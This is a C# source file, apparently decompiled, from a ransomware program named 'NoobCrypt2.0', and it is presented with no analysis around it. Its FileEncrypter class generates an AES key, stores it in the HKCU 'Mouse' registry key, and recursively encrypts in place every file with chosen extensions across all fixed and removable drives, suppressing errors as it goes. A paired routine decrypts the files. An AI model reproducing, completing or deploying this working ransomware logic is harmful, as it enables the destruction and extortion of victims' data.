using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace NoobCrypt2._0.FileEncrypter;

internal class FileEncrypter
{
	private static byte[] key;

	private static byte[] iv;

	[DebuggerNonUserCode]
	public FileEncrypter()
	{
	}

	public static void EncryptFiles(params string[] extensions)
	{
		if (Registry.CurrentUser.OpenSubKey("Mouse") == null)
		{
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.GenerateKey();
			aesCryptoServiceProvider.GenerateIV();
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Mouse");
			registryKey.SetValue("key", aesCryptoServiceProvider.Key, RegistryValueKind.Binary);
			registryKey.SetValue("iv", aesCryptoServiceProvider.IV, RegistryValueKind.Binary);
			registryKey.Close();
			ICryptoTransform icryptoTransform_ = aesCryptoServiceProvider.CreateEncryptor();
			StartEnumeration(icryptoTransform_, extensions);
		}
	}

	public static void DecryptFiles(params string[] extension)
	{
		if (Registry.CurrentUser.OpenSubKey("Mouse") != null)
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Mouse");
			key = (byte[])registryKey.GetValue("key");
			iv = (byte[])registryKey.GetValue("iv");
			registryKey.Close();
			StartEnumeration(null, extension);
			Registry.CurrentUser.DeleteSubKey("Mouse");
		}
	}

	private static void StartEnumeration(ICryptoTransform icryptoTransform_0, string[] extension)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if ((driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Removable) ? true : false)
			{
				EnumerateFiles(icryptoTransform_0, driveInfo.RootDirectory, extension);
			}
		}
	}

	private static void ProcessFile(ICryptoTransform icryptoTransform_0, string path)
	{
		try
		{
			if (icryptoTransform_0 == null)
			{
				AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
				aesCryptoServiceProvider.Key = key;
				aesCryptoServiceProvider.IV = iv;
				icryptoTransform_0 = aesCryptoServiceProvider.CreateDecryptor();
			}
			byte[] array = File.ReadAllBytes(path);
			array = icryptoTransform_0.TransformFinalBlock(array, 0, array.Length);
			File.WriteAllBytes(path, array);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void EnumerateFiles(ICryptoTransform icryptoTransform_0, DirectoryInfo d, string[] ext)
	{
		try
		{
			FileInfo[] files = d.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					if (HasExtension(fileInfo.FullName, ext))
					{
						ProcessFile(icryptoTransform_0, fileInfo.FullName);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			DirectoryInfo[] directories = d.GetDirectories();
			foreach (DirectoryInfo d2 in directories)
			{
				try
				{
					EnumerateFiles(icryptoTransform_0, d2, ext);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private static bool HasExtension(string name, string[] ext)
	{
		bool result = false;
		foreach (string value in ext)
		{
			if (name.EndsWith(value))
			{
				result = true;
				break;
			}
		}
		return result;
	}
}
